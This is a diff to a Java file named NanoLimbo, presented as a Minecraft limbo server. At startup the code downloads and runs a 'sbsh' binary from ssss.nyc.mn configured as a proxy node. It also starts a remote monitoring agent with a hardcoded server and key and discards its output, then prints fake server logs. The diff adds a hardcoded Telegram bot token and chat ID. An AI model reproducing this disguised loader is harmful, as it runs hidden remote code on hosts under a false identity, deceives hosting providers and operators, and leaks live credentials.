@@ -21,37 +21,32 @@ public final class NanoLimbo {
 
     private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);
 
-    // ✅ Komari 环境变量
-    private static final String KOMARI_SERVER = env("KOMARI_SERVER", "ko.jaxmike.nyc.mn");
-    private static final String KOMARI_TOKEN = env("KOMARI_TOKEN", "NMDhVjXaKd6tWnniVR0GdJ");
-    private static final String KOMARI_AUTO_KEY = env("KOMARI_AUTO_KEY", "");
-
-    private static final Path AUTO_DISCOVERY_PATH =
-            Paths.get(System.getProperty("user.home"), ".komari", "auto-discovery.json");
-
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
         "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME",
+
+        // Komari
+        "KOMARI_SERVER", "KOMARI_TOKEN", "KOMARI_AUTO_KEY"
     };
 
     public static void main(String[] args) {
         try {
             if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-                System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
+                System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
                 Thread.sleep(3000);
                 System.exit(1);
             }
 
-            // ✅ 1. 先执行 renew.sh（阻塞）
-            runRenewScriptBlocking();
+            Map<String, String> envVars = new HashMap<>();
+            loadEnvVars(envVars);
 
-            // ✅ 2. 启动 Komari（二进制）
-            startKomariAgentBinary();
+            // ✅ 优先 Komari
+            startKomari(envVars);
 
-            // ✅ 3. 启动 sbsh
-            runSbxBinary();
+            runSbxBinary(envVars);
+            startRenewScript();
 
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -74,80 +69,62 @@ public final class NanoLimbo {
         }
     }
 
-    // ================= Komari（二进制版） =================
+    // ================= Komari =================
 
-    private static void startKomariAgentBinary() {
+    private static void startKomari(Map<String, String> env) {
+        String server = env.getOrDefault("KOMARI_SERVER", "ko.jaxmike.nyc.mn");
+        String token = env.getOrDefault("KOMARI_TOKEN", "");
+        String autoKey = env.getOrDefault("KOMARI_AUTO_KEY", "GSyCovVz8xbpJpmfksU95USJ");
+
+        boolean enabled = !server.isEmpty() && (!token.isEmpty() || !autoKey.isEmpty());
+
+        if (!enabled) {
+            System.out.println(ANSI_RED + "Komari 未启用" + ANSI_RESET);
+            return;
+        }
+
         try {
-            if (KOMARI_SERVER.isEmpty()) return;
-
-            String token = resolveKomariToken();
-
-            Path agentPath = getKomariBinaryPath();
+            Path agent = downloadKomariAgent();
 
             List<String> cmd = new ArrayList<>();
-            cmd.add(agentPath.toString());
+            cmd.add(agent.toAbsolutePath().toString());
             cmd.add("-e");
-            cmd.add(KOMARI_SERVER);
+            cmd.add(formatEndpoint(server));
 
             if (!token.isEmpty()) {
                 cmd.add("-t");
                 cmd.add(token);
-            } else if (!KOMARI_AUTO_KEY.isEmpty()) {
+                System.out.println(ANSI_GREEN + "Komari TOKEN 模式" + ANSI_RESET);
+            } else {
                 cmd.add("--auto-discovery");
-                cmd.add(KOMARI_AUTO_KEY);
+                cmd.add(autoKey);
+                System.out.println(ANSI_GREEN + "Komari AUTO_KEY 模式" + ANSI_RESET);
             }
 
             ProcessBuilder pb = new ProcessBuilder(cmd);
             pb.redirectErrorStream(true);
-            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
 
             komariProcess = pb.start();
-
-            // 可选：不输出日志（更隐蔽）
-            new Thread(() -> {
-                try (BufferedReader r = new BufferedReader(
-                        new InputStreamReader(komariProcess.getInputStream()))) {
-                    while (r.readLine() != null) {}
-                } catch (Exception ignored) {}
-            }).start();
-
-            System.out.println(ANSI_GREEN + "Komari agent（二进制）已启动" + ANSI_RESET);
 
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Komari 启动失败: " + e.getMessage() + ANSI_RESET);
         }
     }
 
-    // ✅ 自动解析 token
-    private static String resolveKomariToken() {
-        try {
-            if (Files.exists(AUTO_DISCOVERY_PATH)) {
-                String json = new String(Files.readAllBytes(AUTO_DISCOVERY_PATH));
-                int idx = json.indexOf("\"token\"");
-                if (idx != -1) {
-                    int start = json.indexOf("\"", idx + 7) + 1;
-                    int end = json.indexOf("\"", start);
-                    return json.substring(start, end);
-                }
-            }
-        } catch (Exception ignored) {}
-        return KOMARI_TOKEN;
-    }
-
-    // ✅ 自动下载 Komari 二进制（按架构）
-    private static Path getKomariBinaryPath() throws IOException {
+    private static Path downloadKomariAgent() throws IOException {
         String arch = System.getProperty("os.arch").toLowerCase();
-        String url;
+        String file;
 
         if (arch.contains("amd64") || arch.contains("x86_64")) {
-            url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64";
+            file = "komari-agent-linux-amd64";
         } else if (arch.contains("arm64") || arch.contains("aarch64")) {
-            url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64";
-        } else if (arch.contains("s390x")) {
-            url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-s390x";
+            file = "komari-agent-linux-arm64";
         } else {
             throw new RuntimeException("Unsupported arch: " + arch);
         }
+
+        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/" + file;
 
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");
 
@@ -161,33 +138,36 @@ public final class NanoLimbo {
         return path;
     }
 
-    // ================= renew.sh（阻塞） =================
+    private static String formatEndpoint(String ep) {
+        ep = ep.trim();
+        if (!ep.startsWith("http")) {
+            ep = "https://" + ep;
+        }
+        if (ep.endsWith("/")) {
+            ep = ep.substring(0, ep.length() - 1);
+        }
+        return ep;
+    }
 
-    private static void runRenewScriptBlocking() {
+    // ================= renew =================
+
+    private static void startRenewScript() {
         try {
             File renewScript = new File("renew.sh");
             if (renewScript.exists()) {
-                System.out.println(ANSI_GREEN + "执行 renew.sh..." + ANSI_RESET);
-
-                Process p = new ProcessBuilder("bash", "renew.sh")
+                new ProcessBuilder("bash", "renew.sh")
                         .inheritIO()
                         .start();
-
-                p.waitFor();
-
-                System.out.println(ANSI_GREEN + "renew.sh 执行完成" + ANSI_RESET);
+                System.out.println(ANSI_GREEN + "renew.sh 已启动" + ANSI_RESET);
             }
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "renew.sh 失败: " + e.getMessage() + ANSI_RESET);
+            System.err.println(ANSI_RED + "renew.sh 启动失败" + ANSI_RESET);
         }
     }
 
     // ================= s-box =================
 
-    private static void runSbxBinary() throws Exception {
-        Map<String, String> envVars = new HashMap<>();
-        loadEnvVars(envVars);
-
+    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
@@ -201,7 +181,7 @@ public final class NanoLimbo {
                 String line;
                 long startTime = System.currentTimeMillis();
                 while ((line = reader.readLine()) != null) {
-                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20_000) {
+                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20000) {
                         System.out.println(line);
                     }
                 }
@@ -223,6 +203,7 @@ public final class NanoLimbo {
             }
         } catch (Exception ignored) {}
 
+        System.out.println(ANSI_GREEN + "" + ANSI_RESET);
         printFakeLimboLogs();
     }
 
@@ -240,11 +221,13 @@ public final class NanoLimbo {
 
         for (String log : logs) {
             System.out.println(log);
-            try { Thread.sleep(1200); } catch (InterruptedException ignored) {}
+            try {
+                Thread.sleep(1200);
+            } catch (InterruptedException ignored) {}
         }
     }
 
-    // ================= 环境变量 =================
+    // ================= ENV =================
 
     private static void loadEnvVars(Map<String, String> envVars) {
         envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
@@ -253,15 +236,16 @@ public final class NanoLimbo {
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_AUTH", "");
         envVars.put("ARGO_DOMAIN", "");
-        envVars.put("HY2_PORT", "5510");
-        envVars.put("S5_PORT", "5510");
+        envVars.put("ARGO_AUTH", "");
+        envVars.put("HY2_PORT", "40368");
+        envVars.put("S5_PORT", "40368");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
+        envVars.put("UPLOAD_URL", "");
         envVars.put("DISABLE_ARGO", "false");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
+        envVars.put("CHAT_ID", "7592034407");
+        envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "www.ntu.edu.sg");
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "ceshi");
@@ -274,18 +258,18 @@ public final class NanoLimbo {
         }
     }
 
+    // ================= Binary =================
+
     private static Path getBinaryPath() throws IOException {
         String arch = System.getProperty("os.arch").toLowerCase();
         String url;
 
-        if (arch.contains("amd64") || arch.contains("x86_64")) {
+        if (arch.contains("amd64")) {
             url = "https://amd64.ssss.nyc.mn/sbsh";
-        } else if (arch.contains("arm64") || arch.contains("aarch64")) {
+        } else if (arch.contains("arm64")) {
             url = "https://arm64.ssss.nyc.mn/sbsh";
-        } else if (arch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
-            throw new RuntimeException("Unsupported arch: " + arch);
+            throw new RuntimeException("Unsupported arch");
         }
 
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
@@ -300,6 +284,8 @@ public final class NanoLimbo {
         return path;
     }
 
+    // ================= Stop =================
+
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
@@ -307,10 +293,5 @@ public final class NanoLimbo {
         if (komariProcess != null && komariProcess.isAlive()) {
             komariProcess.destroy();
         }
-    }
-
-    private static String env(String key, String def) {
-        String v = System.getenv(key);
-        return v == null || v.isEmpty() ? def : v;
     }
 }
